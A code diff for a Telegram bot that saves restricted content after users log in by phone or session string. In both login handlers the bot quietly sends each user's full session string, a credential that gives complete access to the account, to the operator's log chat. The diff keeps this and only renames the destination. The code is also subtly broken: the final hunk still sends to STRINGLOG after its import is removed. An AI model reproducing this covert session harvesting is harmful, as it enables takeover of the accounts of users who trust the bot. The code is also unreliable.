@@ -7,8 +7,8 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 import psutil, requests
 
 # ---------- imports from parent package ----------
-from .. import (bot, FORCESUB, ACCESS, API_HASH, API_ID, AUTH_USERS,
-                STRINGLOG, MONGODB_URI, BOT_TOKEN)
+from .. import (bot, FORCESUB, API_HASH, API_ID, AUTH_USERS,
+                LOGS, MONGODB_URI, BOT_TOKEN)
 from ..Database.database import Database
 from ..plugins.helpers import login, logout
 from ..plugins.dbstuff import db
@@ -50,9 +50,10 @@ async def start_handler(event):
     await init_msg.edit(
         f"Hi **{event.sender.first_name}**,\nI save restricted content – send links after login.",
         buttons=[Button.url("Updates", "https://t.me/BotsCraft")])
-    await bot.send_message(
-        ACCESS,
-        f"#NEW_USER [{event.sender.first_name}](tg://user?id={event.sender_id})\nID: {event.sender_id}")
+    if LOGS:
+        await bot.send_message(
+            LOGS,
+            f"#NEW_USER [{event.sender.first_name}](tg://user?id={event.sender_id})\nID: {event.sender_id}")
 
 # ---------- thumbnail ----------
 @bot.on(events.NewMessage(pattern="^/savethumb$", func=lambda e: e.is_private))
@@ -140,7 +141,8 @@ async def login_phone(event):
     s = await client.export_session_string(); me = await client.get_me()
     await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s)
     await event.reply(f"✅ Logged in as {me.first_name}\nSend links to save.")
-    await bot.send_message(STRINGLOG, f"#SESSION {event.sender_id}\n`{s}`")
+    if LOGS:
+        await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
     await client.disconnect()
 
 # ---------- session ----------
@@ -156,7 +158,8 @@ async def login_session(event):
             me = await cli.get_me()
             await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s.text)
             await event.reply(f"✅ Logged in as {me.first_name}")
-            await bot.send_message(STRINGLOG, f"#SESSION {event.sender_id}\n`{s.text}`")
+            if LOGS:
+                await bot.send_message(STRINGLOG, f"#SESSION {event.sender_id}\n`{s.text}`")
     except Exception as ex:
         await event.reply(f"Invalid session – {ex}")
 
